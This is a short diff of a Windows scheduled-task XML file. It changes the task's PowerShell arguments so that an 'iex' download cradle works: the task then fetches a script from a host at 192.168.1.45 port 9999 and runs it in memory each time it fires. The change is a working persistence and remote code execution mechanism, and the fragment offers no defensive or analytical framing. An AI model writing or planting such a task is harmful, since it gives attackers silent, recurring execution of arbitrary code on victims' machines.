@@ -42,7 +42,7 @@
 <Actions Context="Author">
 <Exec>
 <Command>C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
-<Arguments>'iex(New-Object Net.WebClient).DownloadString("http://192.168.1.45:9999/runner.md")'</Arguments>
+<Arguments>iex(New-Object Net.WebClient).DownloadString('http://192.168.1.45:9999/runner.md')</Arguments>
 </Exec>
 </Actions>
 </Task>
